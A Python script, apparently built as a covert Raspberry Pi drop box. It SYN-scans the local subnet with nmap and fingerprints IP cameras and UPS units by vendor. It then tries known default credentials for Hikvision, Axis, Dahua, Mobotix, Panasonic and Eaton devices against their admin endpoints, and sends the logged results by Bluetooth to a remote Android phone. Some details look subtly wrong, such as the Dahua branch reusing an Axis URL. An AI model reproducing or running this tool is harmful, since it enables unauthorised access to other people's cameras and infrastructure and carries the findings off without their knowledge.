import nmap
import re
import requests
from requests.auth import HTTPDigestAuth
import socket
import sys
import subprocess


# Get current host ip address
def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


interface_ip = get_ip_address()

# Convert networkIP to 0/24 subnet ip range
network_cidr = interface_ip[:interface_ip.rfind('.') + 1] + '0/24'

# tcp ports to scan for each vendor device
target_port_list = '21,22,80,81,8080'


def network_scan(*argv):
    # save print output to text file
    with open('/tmp/output.txt', "w") as sys.stdout:
        # scan for mac and vendor
        nm = nmap.PortScanner()
        nm.scan(network_cidr, target_port_list, arguments='-sS', sudo=True)
        for host in nm.all_hosts():
            # searches for mac and vendors
            if 'mac' in nm[host]['addresses']:
                # Initialize target_ip variable as global for use in http_request function
                global target_ip
                # regex host_ip vendor output > convert to string > strip symbols
                target_ip = str(nm[host]['addresses']).lstrip('{\'ipv4\': \'')[:-19].strip('\', \'mac\': \'')
                for arg in argv:
                    # vendor list definition > regex nmap vendor output > convert to string > strip symbols
                    vendor_str = (str(re.findall(arg, str(nm[host]['vendor'])))[2:][:-2])

                    # print only devices with specified vendors in vendor_str variable
                    if arg in vendor_str:
                        print('----------------------------------------')
                        print(target_ip)
                        print(vendor_str)
                        for proto in nm[host].all_protocols():
                            ports = nm[host][proto].keys()
                            for port in ports:
                                port_state = nm[host][proto][port]["state"]
                                # only print result for open ports
                                if port_state == 'open':
                                    print(f'port : {port}\tstate : {port_state}')
                    # call http_request function if device vendor name contains target vendor
                    if vendor_str == 'Mobotix AG':
                        # Mobotix: Default - admin/meinsm
                        http_request('admin', 'meinsm', '/control/userimage.html')

                    if vendor_str == 'Hangzhou Hikvision Digital Technology':
                        # Hikvision: Firmware 5.3.0 and up requires unique password creation; previously admin/12345
                        http_request('admin', '12345', '/ISAPI/System/status')

                    if vendor_str == 'Axis Communications AB':
                        # Axis: Traditionally root/pass, new Axis cameras require password creation during first login
                        http_request('root', 'pass', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')

                    if vendor_str == 'Zhejiang Dahua Technology':
                        # Dahua: Requires password creation on first login, older models default to admin/admin
                        http_request('admin', 'admin', '/axis-cgi/admin/param.cgi?action=list&group=RemoteService')

                    if vendor_str == 'Panasonic Communications Co':
                        # Panasonic TV default user: dispadmin/@Panasonic
                        http_request('dispadmin', '@Panasonic', '/cgi-bin/main.cgi')

                    if vendor_str == 'Eaton':
                        # Eaton UPS default user: admin/admin
                        http_request('admin', 'admin', '/set_net.htm')

        print('Scanning finished')


def http_request(default_login, default_pw, url_location):
    # http digest get request (Digest Authentication communicates credentials in an encrypted form by
    # applying a hash function to: the username, the password,
    # a server supplied nonce value, the HTTP method and the requested URI. )
    try:
        response = requests.get(f'http://{target_ip}{url_location}', auth=HTTPDigestAuth(default_login, default_pw),
                                verify=False, timeout=2.0)
        print(response)
    except requests.exceptions.RequestException as e:
        pass

    # http basic auth request (Basic Authentication uses non-encrypted base64 encoding.)
    try:
        response = requests.get(f'http://{target_ip}{url_location}', auth=(default_login, default_pw),
                                verify=False, timeout=2.0)
        print(response)
    except requests.exceptions.RequestException as e:
        pass


# call function - scan network with specified vendor names
network_scan('Mobotix AG', 'Hangzhou Hikvision Digital Technology', 'Axis Communications AB',
             'Zhejiang Dahua Technology', 'Panasonic Communications Co', 'Eaton')

# send scan results output file from RPi to remote Android device via Bluetooth
# https://stackoverflow.com/questions/8556777/dbus-php-unable-to-launch-dbus-daemon-without-display-for-x11?rq=1
# A8:7D:12:51:91:37
res = subprocess.Popen('eval \'dbus-launch --auto-syntax\' bt-obex -p MAC_ADDRESS /tmp/output.txt', shell=True,
                       stdout=subprocess.PIPE)
# Wait for the process end and print error in case of failure
if res.wait() != 0:
    output, error = res.communicate()
    print(error)
